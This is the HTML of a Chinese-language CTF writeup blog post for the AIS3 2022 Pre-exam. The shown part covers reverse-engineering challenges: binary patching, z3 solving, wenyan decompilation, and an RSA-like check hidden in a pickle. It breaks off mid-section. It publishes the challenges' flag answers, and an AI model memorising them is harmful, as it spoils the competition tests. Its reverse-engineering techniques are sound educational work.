@@ -1,0 +1,1774 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>AIS3 2022 Pre-exam Writeup | Ice1187’s Blog</title>
+<meta name="description" content="從 226 名、49 名，一直到今年的第 2 名，著實感受到自己的進步，雖然也有一部分是因為跟我差不多時期的人可能都去出題了，所以競爭沒有往年激烈。不過還是很高興可以看見從上大學到現在有一點一點地在進步，期許畢業前可以在 EOF 上也有更好的 solo 成績。">
+
+
+  <meta name="author" content="Ice1187">
+  
+  <meta property="article:author" content="Ice1187">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Ice1187's Blog">
+<meta property="og:title" content="AIS3 2022 Pre-exam Writeup">
+<meta property="og:url" content="https://ice1187.github.io/ais3-2022-pre-exam-writeup/">
+
+
+  <meta property="og:description" content="從 226 名、49 名，一直到今年的第 2 名，著實感受到自己的進步，雖然也有一部分是因為跟我差不多時期的人可能都去出題了，所以競爭沒有往年激烈。不過還是很高興可以看見從上大學到現在有一點一點地在進步，期許畢業前可以在 EOF 上也有更好的 solo 成績。">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-07-03T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://ice1187.github.io/ais3-2022-pre-exam-writeup/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Ice1187",
+      "url": "https://ice1187.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Ice1187's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/hackthebox/">Hack The Box</a>
+            </li><li class="masthead__menu-item">
+              <a href="/rl/">Reinforcement Learning</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/avatar.jpeg" alt="Ice1187" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Ice1187</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>A CS student/CTF player interested in Security.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/ice1187" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="AIS3 2022 Pre-exam Writeup">
+    <meta itemprop="description" content="從 226 名、49 名，一直到今年的第 2 名，著實感受到自己的進步，雖然也有一部分是因為跟我差不多時期的人可能都去出題了，所以競爭沒有往年激烈。不過還是很高興可以看見從上大學到現在有一點一點地在進步，期許畢業前可以在 EOF 上也有更好的 solo 成績。">
+    <meta itemprop="datePublished" content="2022-07-03T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">AIS3 2022 Pre-exam Writeup
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-07-03T00:00:00+00:00">July 3, 2022</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#rank">Rank</a></li><li><a href="#reverse">Reverse</a><ul><li><a href="#time-management">Time Management</a></li><li><a href="#calculator">Calculator</a></li><li><a href="#殼">殼</a></li><li><a href="#flag-checker">Flag Checker</a></li><li><a href="#rideti">Rideti</a></li><li><a href="#strings">Strings</a></li></ul></li><li><a href="#web">Web</a><ul><li><a href="#poking-bear">Poking Bear</a></li><li><a href="#simple-file-uploader">Simple File Uploader</a></li><li><a href="#tari-tari">Tari Tari</a></li><li><a href="#the-best-login-ui">The Best Login UI</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#saas--crash">SAAS — Crash</a></li><li><a href="#bof2win">BOF2WIN</a></li><li><a href="#give-me-sc">Give Me SC</a></li><li><a href="#magic">Magic</a></li><li><a href="#utf-8-editor--crash">UTF-8 Editor — Crash</a></li></ul></li><li><a href="#crypto">Crypto</a><ul><li><a href="#sc">SC</a></li><li><a href="#fast-cipher">Fast Cipher</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#excel">Excel</a></li><li><a href="#gift-in-the-dream">Gift in the dream</a></li><li><a href="#knock">Knock</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p>從 226 名、49 名，一直到今年的第 2 名，著實感受到自己的進步，雖然也有一部分是因為跟我差不多時期的人可能都去出題了，所以競爭沒有往年激烈。不過還是很高興可以看見從上大學到現在有一點一點地在進步，期許畢業前可以在 EOF 上也有更好的 solo 成績。</p>
+
+<p>不得不說 AIS3 pre-exam 每年都有用心在出題目，相較 CTFTime 上常有些不明所以的 CTF，pre-exam 打起來都是很開心的。</p>
+
+<h2 id="rank">Rank</h2>
+
+<ul>
+  <li>Team: <code class="language-plaintext highlighter-rouge">Ice1187</code></li>
+  <li>Ranking: 2nd</li>
+  <li>Writeup Repo: <a href="https://github.com/Ice1187/AIS3-2022-Pre-exam-Writeup" title="Ice1187/AIS3-2022-Pre-exam-Writeup">Ice1187/AIS3-2022-Pre-exam-Writeup</a></li>
+</ul>
+
+<p><img width="800" alt="ais3-pre-exam-scoreboard" src="https://user-images.githubusercontent.com/38059464/175545378-5b5f373e-7da8-4c96-b7d7-463e5a16caf5.png" /></p>
+
+<h2 id="reverse">Reverse</h2>
+
+<h3 id="time-management">Time Management</h3>
+
+<ol>
+  <li>每次 print flag 的一個字元要等 30000 多秒。
+<img width="600" alt="time-management-sleep" src="https://user-images.githubusercontent.com/38059464/176660727-2e290e6f-0d5c-44c4-b296-f1fd0978461a.png" /></li>
+  <li>從 <code class="language-plaintext highlighter-rouge">objdump</code> 找到要 patch 的 instruction 在 <code class="language-plaintext highlighter-rouge">0x122b</code>。
+<img width="600" alt="time-management-instruct" src="https://user-images.githubusercontent.com/38059464/176661153-ef3dc1bc-751e-480f-89d2-edeef8959421.png" /></li>
+  <li>用 vim 打開 <code class="language-plaintext highlighter-rouge">chal</code>，然後輸入指令 <code class="language-plaintext highlighter-rouge">:%!xxd</code> 將 binary 轉成 <code class="language-plaintext highlighter-rouge">xxd</code> 的 hexdump 格式。
+<img width="527" alt="time-management-convert" src="https://user-images.githubusercontent.com/38059464/176663520-977eb575-f806-43b7-9df4-b87a9487ee95.png" /></li>
+  <li>找到 <code class="language-plaintext highlighter-rouge">0x122b</code> 的位置即為要 patch 的部分 <code class="language-plaintext highlighter-rouge">0x00008763</code>。
+<img width="600" alt="time-management-before-patch" src="https://user-images.githubusercontent.com/38059464/176662170-71bd84e7-b3c9-475e-9d6d-20109f4dfbd1.png" /></li>
+  <li>將其修改成 1 秒，同時也把右半部的 ASCII 改成 <code class="language-plaintext highlighter-rouge">.</code>。
+<img width="600" alt="time-management-after-patch" src="https://user-images.githubusercontent.com/38059464/176662667-939556fb-5fde-4703-a23c-8d10037923b2.png" /></li>
+  <li>輸入指令 <code class="language-plaintext highlighter-rouge">:%!xxd -r</code> 將 hexdump revert 回 binary。
+<img width="600" alt="time-management-revert" src="https://user-images.githubusercontent.com/38059464/176663015-142c69ca-0ad9-4692-815a-d126cb9e6af2.png" /></li>
+  <li>執行 patch 後的 binary 即可得到 flag，但因為最後會輸出 <code class="language-plaintext highlighter-rouge">\r</code>，因此要邊輸出邊按換行避免輸出被蓋掉。
+<img width="600" alt="time-management-flag" src="https://user-images.githubusercontent.com/38059464/176664787-295a4753-cfaa-4479-b3ce-7bd92ddad48c.png" /></li>
+</ol>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{You_are_the_master_of_time_management!!!!!}</code></p>
+
+<h3 id="calculator">Calculator</h3>
+
+<ol>
+  <li>用 <a href="https://github.com/dnSpy/dnSpy"><code class="language-plaintext highlighter-rouge">dnSpy</code></a> 打開 <code class="language-plaintext highlighter-rouge">Extensions</code> 中的各個 <code class="language-plaintext highlighter-rouge">AIS3.dll</code>，可以看到多層對輸入的檢查。
+<img width="800" alt="calculator-check" src="https://user-images.githubusercontent.com/38059464/176863412-08014fae-f061-4acf-a1fa-2098ddffd515.png" /></li>
+  <li>
+    <p>使用 <code class="language-plaintext highlighter-rouge">z3</code> 找出正確的輸入即為 flag，詳細 code 可以參考 <code class="language-plaintext highlighter-rouge">solve.py</code>。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
+   
+<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="n">BitVec</span><span class="p">(</span><span class="sa">f</span><span class="s">'a[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">]'</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">46</span><span class="p">)]</span>
+<span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
+   
+<span class="n">solver</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'A'</span><span class="p">))</span>
+   
+<span class="c1"># AIS3
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">solver</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">14</span><span class="o">+</span><span class="n">offset</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'A'</span><span class="p">))</span>
+<span class="n">solver</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="o">+</span><span class="n">offset</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'{'</span><span class="p">))</span>
+<span class="n">array</span> <span class="o">=</span> <span class="p">[</span><span class="mi">30</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">100</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">array</span><span class="p">)):</span>
+    <span class="n">solver</span><span class="p">.</span><span class="n">add</span><span class="p">((</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">offset</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'W'</span><span class="p">))</span> <span class="o">==</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+<span class="k">print</span><span class="p">(</span><span class="n">solver</span><span class="p">.</span><span class="n">check</span><span class="p">())</span>
+   
+<span class="c1"># more checks...
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}</code></p>
+
+<h3 id="殼">殼</h3>
+
+<ol>
+  <li>如果有看過，應該會知道這是<a href="https://github.com/wenyan-lang/wenyan">文言</a>，一種文言文程式語言。
+<img width="947" alt="wenyan-code" src="https://user-images.githubusercontent.com/38059464/176665877-d7ad91d9-6466-4fd4-b117-c9424b3b1ca2.png" /></li>
+  <li>
+    <p>可以透過以下指令執行 <code class="language-plaintext highlighter-rouge">殼.wy</code> 和將其轉成 JavaScript。</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>npm <span class="nb">install</span> @wenyan/core
+<span class="nv">$ </span>npm <span class="nb">install </span>js-beautify
+   
+<span class="nv">$ </span>./node_modules/.bin/wenyan <span class="nt">--dir</span> ./chal/藏書樓/ ./chal/殼.wy   <span class="c"># execute</span>
+輸入「助」以獲得更多幫助
+<span class="o">&gt;</span>
+   
+<span class="nv">$ </span><span class="nb">cd</span> ./chal
+<span class="nv">$ </span>npx <span class="nt">--package</span><span class="o">=</span>@wenyan/cli wenyan <span class="nt">-c</span> <span class="nt">-o</span> ../decomp.js <span class="nt">-r</span> <span class="nt">--roman</span> pinyin 殼.wy   <span class="c"># convert to JavaScript</span>
+<span class="nv">$ </span>node_modules/.bin/js-beautify ./decomp.js <span class="o">&gt;</span> decomp_beauty.js                  <span class="c"># beautify JavaScript</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>簡單看一下 JavaScript code 可以發現輸入要以 <code class="language-plaintext highlighter-rouge">蛵煿</code> 開頭，然後輸入經過一些運算之後要符合 <code class="language-plaintext highlighter-rouge">密旗</code> (<code class="language-plaintext highlighter-rouge">MI4QI2</code>) 這個變數的內容。
+<img width="592" alt="wenyan-decomp" src="https://user-images.githubusercontent.com/38059464/176666873-ab912dba-1218-44e0-b0bb-d01f41b87c56.png" /></li>
+  <li>後來實在是懶得看又醜又長的 JavaScript，觀察輸入之後發現每 3 個輸入字元決定 2 個輸出字元，因此把 mapping 建出來，就能直接從答案反推輸入了。所有組合大概有 1000000 組，最後花了 6~8 個小時建出大概 8 成的 mapping，然後反推輸入得到 flag。
+<img width="1372" alt="wenyan-guess" src="https://user-images.githubusercontent.com/38059464/176668657-68797378-5fea-4173-a99a-fb3aa1289847.png" /></li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{chaNcH4n_a1_Ch1k1ch1k1_84n8An_M1nNa_5upa5utA_n0_TAMa90_5a}</code></p>
+
+<h3 id="flag-checker">Flag Checker</h3>
+
+<ol>
+  <li>Bianry 需要 <code class="language-plaintext highlighter-rouge">GLIBC_2.33</code>, <code class="language-plaintext highlighter-rouge">GLIBC_2.34</code>，可以用 docker 建一個臨時的 Ubuntu 22.04 來用。
+<img width="1086" alt="flag-cheker-glibc" src="https://user-images.githubusercontent.com/38059464/176669338-09ce8646-a074-47d4-a61e-fc3f1caaedc9.png" /></li>
+  <li>
+    <p>跑 Ubuntu 22.04 docker container。</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>Dockerfile
+FROM ubuntu:22.04
+RUN apt-get update <span class="o">&amp;&amp;</span> apt-get upgrade <span class="nt">-y</span>
+   
+COPY ./flag_checker /
+   
+<span class="nv">$ </span><span class="nb">sudo </span>docker build <span class="nt">-t</span> flag-checker-demo <span class="nb">.</span>
+<span class="nv">$ </span><span class="nb">sudo </span>docker run <span class="nt">-itd</span> flag-checker-demo:latest
+eccce3f0aa7eaf6dcd8548afc5a57ff5a289fbc4ff99611b4dbeadeafc41d1a8
+<span class="nv">$ </span><span class="nb">sudo </span>docker <span class="nb">exec</span> <span class="nt">-it</span> eccc /bin/bash
+root@eccce3f0aa7e:/# ./flag_checker
+a
+Bad
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>從 IDA 得知輸入開頭須為 <code class="language-plaintext highlighter-rouge">AIS3{</code>。
+<img width="533" alt="flag-checker-ais3-start" src="https://user-images.githubusercontent.com/38059464/176687851-9211a505-7b70-4ca4-a28c-1308ab8e265f.png" /></li>
+  <li>
+    <p>用 <code class="language-plaintext highlighter-rouge">gdb</code> 追進去，看到 <code class="language-plaintext highlighter-rouge">Thread dubugging</code> 因此猜測可能有 call <code class="language-plaintext highlighter-rouge">fork</code> 或 <code class="language-plaintext highlighter-rouge">execve</code> 之類的 system call。用 <code class="language-plaintext highlighter-rouge">catch syscall</code> 在遇到 syscall 時中斷，發現其透過 <code class="language-plaintext highlighter-rouge">execve</code> 執行 <code class="language-plaintext highlighter-rouge">python</code>。</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre>pwndbg&gt; r
+Starting program: /flag_checker
+warning: Error disabling address space randomization: Operation not permitted
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
+^C
+Program received signal SIGINT, Interrupt.
+pwndbg&gt; ni
+AIS3<span class="o">{</span>AAAAAAAA<span class="o">}</span>
+pwndbg&gt; catch syscall
+Catchpoint 1 <span class="o">(</span>any syscall<span class="o">)</span>
+pwndbg&gt; c
+Continuing.
+   
+Catchpoint 1 <span class="o">(</span>call to syscall execve<span class="o">)</span>, 0x00005582a84281d0 <span class="k">in</span> ?? <span class="o">()</span>
+pwndbg&gt; ni
+────────────────────────[ STACK <span class="o">]</span>────────────────────────
+00:0000│ rsp 0x7fff7b088140 ◂— 0x4
+01:0008│     0x7fff7b088148 —▸ 0x7fff7b0884dc ◂— 0x336e6f68747970 /<span class="k">*</span> <span class="s1">'python3'</span> <span class="k">*</span>/
+02:0010│     0x7fff7b088150 —▸ 0x7fff7b0884e4 ◂— 0x706d695f5f00632d /<span class="k">*</span> <span class="s1">'-c'</span> <span class="k">*</span>/
+03:0018│     0x7fff7b088158 —▸ 0x7fff7b0884e7 ◂— 0x74726f706d695f5f <span class="o">(</span><span class="s1">'__import'</span><span class="o">)</span>
+04:0020│     0x7fff7b088160 —▸ 0x7fff7b0888fd ◂— <span class="s1">'AAAAAAAA}'</span>
+05:0028│     0x7fff7b088168 ◂— 0x0
+06:0030│     0x7fff7b088170 —▸ 0x7fff7b088907 ◂— <span class="s1">'LESSOPEN=| /usr/bin/lesspipe %s'</span>
+07:0038│     0x7fff7b088178 —▸ 0x7fff7b088927 ◂— <span class="s1">'HOSTNAME=73648dfc4d1a'</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><img width="800" alt="flag-checker-see-python" src="https://user-images.githubusercontent.com/38059464/176689285-713021ea-b4e7-4ad7-b158-4c8d279bf6f8.png" /></p>
+
+<ol>
+  <li>用 <code class="language-plaintext highlighter-rouge">dump</code> 把執行的 command 拉出來。
+<img width="800" alt="flag-checker-dump-python" src="https://user-images.githubusercontent.com/38059464/176690786-295fef4c-9da4-41e7-ae60-846c1fa5d3a7.png" />
+<img width="800" alt="flag-checker-python-cmd" src="https://user-images.githubusercontent.com/38059464/176691230-ed335cfd-771c-4ba4-b317-9d5447cf3919.png" /></li>
+  <li>用 <a href="https://docs.python.org/3/library/pickletools.html"><code class="language-plaintext highlighter-rouge">picktools</code></a> disassemble pickle code，可以參考 script <code class="language-plaintext highlighter-rouge">disasm.py</code>。
+<img width="800" alt="flag-checker-disasm" src="https://user-images.githubusercontent.com/38059464/176692533-fa7bf77f-2e7f-44b5-81e8-1e8b2c805c3c.png" /></li>
+  <li>讀一下 disassemble 的 pickle，還原其 check 大致如下：
+<img width="1384" alt="flag-checker-rsa-like-check" src="https://user-images.githubusercontent.com/38059464/176693484-340d42d5-702c-4c87-b4a4-3b180087e0ff.png" /></li>
+  <li>
+    <p>觀察上述 check 可發現，此算法與 RSA 十分相似：<code class="language-plaintext highlighter-rouge">a</code> 是明文，<code class="language-plaintext highlighter-rouge">b</code> 是密文，<code class="language-plaintext highlighter-rouge">65537</code> 是 <code class="language-plaintext highlighter-rouge">e</code>，一長串模數是 <code class="language-plaintext highlighter-rouge">N</code>，只差在 <a href="http://factordb.com/index.php?query=542732316977950510497270190501021791757395568139126739977487019184541033966691938940926649138411381198426866278991473"><code class="language-plaintext highlighter-rouge">N</code> 本身即是質數</a>，而不是兩個質數的積。但這並不影響 RSA decrypt 的運算，因此可以用以下方法還原輸入，得到 flag。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">inverse</span>
+   
+<span class="c1"># RSA-like solution
+</span><span class="n">n</span> <span class="o">=</span> <span class="mi">542732316977950510497270190501021791757395568139126739977487019184541033966691938940926649138411381198426866278991473</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span>    <span class="c1"># n is a prime, so r = phi(n) = n-1
+</span><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">451736263303355935449028567064392382249020023967373174925770068593206982683303653948838172763093279548888815048027759</span>
+<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s">'big'</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">'AIS3{'</span> <span class="o">+</span> <span class="n">flag</span>
+   
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{from_rop_to_python_to_pickle_to_math}</code></p>
+
+<h3 id="rideti">Rideti</h3>
+
+<ol>
+  <li>字串中的 <code class="language-plaintext highlighter-rouge">@CONGRATULATIONS!</code> 應該是我們的目標。
+<img width="589" alt="rideti-strings" src="https://user-images.githubusercontent.com/38059464/176874153-6c012257-c844-4f0d-8a03-aa7cf079f50d.png" /></li>
+  <li>IDA 不認得 string。觀察字串的使用方式後，可以建出 <code class="language-plaintext highlighter-rouge">my_string</code> struct 然後 apply 到字串上。
+<img width="879" alt="rideti-my-string" src="https://user-images.githubusercontent.com/38059464/176874522-07ab2d89-402d-46d4-b86e-7b86724d4826.png" /></li>
+  <li>經過一番逆向後，可以發現去到勝利畫面 <code class="language-plaintext highlighter-rouge">scene_final</code> 的條件為 <code class="language-plaintext highlighter-rouge">scene_state = 2</code>，而當分數 <code class="language-plaintext highlighter-rouge">score = 3962971405739</code> 時，<code class="language-plaintext highlighter-rouge">scene_state</code> 被設成 2。
+<img width="623" alt="rideti-scene-final" src="https://user-images.githubusercontent.com/38059464/176875514-7adf1c53-0eac-4d3d-b37f-8bea4acb5cee.png" />
+<img width="681" alt="rideti-set-scene-2" src="https://user-images.githubusercontent.com/38059464/176875762-a279a0cc-25d3-4768-a2b2-c13f4b4dd793.png" /></li>
+  <li>用 <a href="https://x64dbg.com"><code class="language-plaintext highlighter-rouge">x64dbg</code></a> 在走到 check 時手動把 <code class="language-plaintext highlighter-rouge">score</code> 改成 <code class="language-plaintext highlighter-rouge">3962971405739</code> 即可拿到 flag。<code class="language-plaintext highlighter-rouge">x64dbg</code> 使用教學可以參考<a href="https://morosedog.gitlab.io/categories/x64dbg/page/4/">這個</a>。
+<img width="727" alt="rideti-flag" src="https://user-images.githubusercontent.com/38059464/176876978-cc14e03d-32e7-4929-a672-fb5082393f18.png" /></li>
+</ol>
+
+<p><strong>Flag:</strong> 沒有存到當時給的 flag 字體的網站，所以就看圖吧 XD</p>
+
+<h3 id="strings">Strings</h3>
+
+<ol>
+  <li>既然題目叫 <code class="language-plaintext highlighter-rouge">Strings</code>，就先 <code class="language-plaintext highlighter-rouge">strings</code> 一下，可以發現類似 flag 的字串。
+<img width="800" alt="strings-likely-flag" src="https://user-images.githubusercontent.com/38059464/176866947-dc777d95-7e64-4370-8867-af7e0cdb2558.png" /></li>
+  <li>此題為 Rust binary，IDA 的 decompile 很難看，直接看 disassembly graph 會好一點。經過一番動靜態混合的分析，可以找到輸入從 <code class="language-plaintext highlighter-rouge">my_readline</code> 讀入。
+<img width="747" alt="strings-my_readline" src="https://user-images.githubusercontent.com/38059464/176865770-f7527f18-a247-4ba3-9172-9b24ae662d08.png" /></li>
+  <li>將輸入 <code class="language-plaintext highlighter-rouge">trim</code> 過之後，以 <code class="language-plaintext highlighter-rouge">_</code> 為分隔做 <code class="language-plaintext highlighter-rouge">split</code>。
+<img width="800" alt="strings-trim-split" src="https://user-images.githubusercontent.com/38059464/176866068-7bb79a10-e436-4428-80f1-38a989767843.png" /></li>
+  <li><code class="language-plaintext highlighter-rouge">split</code> 之後存入 <code class="language-plaintext highlighter-rouge">vec</code> 型態，然後進入共 11 次的 loop。由此可以猜測 flag 裡應該由 10 個 <code class="language-plaintext highlighter-rouge">_</code> 和 11 個字串組合而成。
+<img width="759" alt="strings-11-loop" src="https://user-images.githubusercontent.com/38059464/176867065-ed4d987a-c9c4-4366-8e9e-b503cfe1e413.png" /></li>
+  <li>loop 裡 <code class="language-plaintext highlighter-rouge">memcpy</code> 了 11 個 integer <code class="language-plaintext highlighter-rouge">some_index</code>，然後用這些 integer 去 index 最一開始看到的類似 flag 的字串 <code class="language-plaintext highlighter-rouge">FLAG</code>，再和輸入進行比較。因此猜測這 11 個數字便是 <code class="language-plaintext highlighter-rouge">FLAG</code> 裡組成 flag 的字串的 index。
